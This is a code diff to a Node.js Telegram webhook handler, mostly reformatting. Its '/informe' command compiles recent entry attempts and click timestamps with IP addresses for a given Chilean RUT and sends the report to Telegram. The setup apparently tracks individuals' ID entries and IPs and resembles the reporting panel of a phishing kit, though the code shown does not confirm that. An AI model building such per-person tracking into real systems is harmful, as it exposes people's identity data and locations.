@@ -675,6 +675,7 @@ async function responderCallback(callbackId, texto) {
 app.post("/telegram-webhook", async (req, res) => {
   const update = req.body;
 
+  // --- CALLBACK QUERY ---
   if (update.callback_query) {
     const data = update.callback_query.data;
     const chatId = update.callback_query.message.chat.id;
@@ -707,51 +708,58 @@ app.post("/telegram-webhook", async (req, res) => {
       await responderCallback(update.callback_query.id, `RUT desbloqueado: ${rut}`);
       await panelRUTs(chatId);
     }
+
     return res.sendStatus(200);
   }
-if (update.message) {
-  const text = update.message.text || "";
-  const chatId = update.message.chat.id;
 
-  if (text.startsWith("/panel")) {
-    await enviarPanelUnificado(chatId);
+  // --- MENSAJE NORMAL ---
+  if (update.message) {
+    const text = update.message.text || "";
+    const chatId = update.message.chat.id;
+
+    if (text.startsWith("/panel")) {
+      await enviarPanelUnificado(chatId);
+    }
+
+    // =======================
+    //   INFORME COMPLETO POR RUT
+    // =======================
+    if (text.startsWith("/informe")) {
+      const rut = text.replace("/informe ", "").trim();
+
+      const ingresos = db.prepare(`
+        SELECT fecha FROM intentos_rut
+        WHERE rut = ?
+        ORDER BY fecha DESC
+        LIMIT 20
+      `).all(rut);
+
+      const clics = db.prepare(`
+        SELECT fecha, ip FROM tracking_clicks
+        WHERE rut = ?
+        ORDER BY fecha DESC
+        LIMIT 20
+      `).all(rut);
+
+      let mensaje = `📄 INFORME COMPLETO\nRUT: ${rut}\n\n`;
+
+      mensaje += `🔐 Últimos ingresos (${ingresos.length})\n`;
+      ingresos.forEach(r => {
+        mensaje += `• ${r.fecha}\n`;
+      });
+
+      mensaje += `\n🔎 Últimos clics (${clics.length})\n`;
+      clics.forEach(c => {
+        mensaje += `• ${c.fecha} — IP ${c.ip}\n`;
+      });
+
+      await enviarATelegram(mensaje);
+    }
+
+    return res.sendStatus(200);
   }
-  // =======================
-  //   INFORME COMPLETO POR RUT
-  // =======================
-  if (text.startsWith("/informe")) {
-    const rut = text.replace("/informe ", "").trim();
 
-    const ingresos = db.prepare(`
-      SELECT fecha FROM intentos_rut
-      WHERE rut = ?
-      ORDER BY fecha DESC
-      LIMIT 20
-    `).all(rut);
-
-    const clics = db.prepare(`
-      SELECT fecha, ip FROM tracking_clicks
-      WHERE rut = ?
-      ORDER BY fecha DESC
-      LIMIT 20
-    `).all(rut);
-
-    let mensaje = `📄 INFORME COMPLETO\nRUT: ${rut}\n\n`;
-
-    mensaje += `🔐 Últimos ingresos (${ingresos.length})\n`;
-    ingresos.forEach(r => {
-      mensaje += `• ${r.fecha}\n`;
-    });
-
-    mensaje += `\n🔎 Últimos clics (${clics.length})\n`;
-    clics.forEach(c => {
-      mensaje += `• ${c.fecha} — IP ${c.ip}\n`;
-    });
-
-    await enviarATelegram(mensaje);
-  }
-
- 
+  // --- SI NO ES NADA ---
   res.sendStatus(200);
 });
 
